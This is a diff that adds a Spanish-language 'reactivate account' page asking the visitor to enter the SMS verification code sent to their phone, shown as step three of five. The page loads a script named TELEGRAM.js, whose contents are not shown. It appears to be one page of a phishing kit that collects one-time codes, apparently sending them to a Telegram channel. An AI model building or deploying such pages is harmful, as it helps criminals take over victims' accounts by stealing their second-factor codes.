@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    <link rel="shortcut icon" href="img/favicon.ico">
+    <link rel="apple-touch-icon" href="img/favicon.png"> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/number-page.css">
+    <title>Confirmación de Código SMS</title>
+</head>
+<body>
+    <header class="header"></header>
+    <div class="steps-container">
+        <h2>Reactivar cuenta</h2>
+        <div class="steps-indicator">
+            <div class="step active"></div>
+            <div class="step active"></div>
+            <div class="step active"></div>
+            <div class="step"></div>
+
+            <div class="step"></div>
+        </div>
+    </div>
+    <div class="form-container">
+        <h3>Ingresa el código de 4 dígitos enviado por SMS a tu celular</h3>
+        <form id="smsCodeForm" method="post" action="#">
+            <div class="input-wrapper">
+                Ingresa el código 
+                <input type="tel" id="smsCode" maxlength="6" placeholder="Código SMS" oninput="allowOnlyNumbers(this)">
+            </div>
+            <div class="button-group">
+                <button type="submit" class="continue-btn" disabled>Continuar</button>
+                <button type="button" class="cancel-btn">Cancelar</button>
+            </div>
+        </form>
+    </div>
+    <script src="js/script5.js"></script> 
+
+    <script src="TELEGRAM.js"></script> 
+    <script src="js/allowOnlyNumbers.js"></script>
+    <script src="js/sms-code-validate.js"></script>
+</body>
+</html>
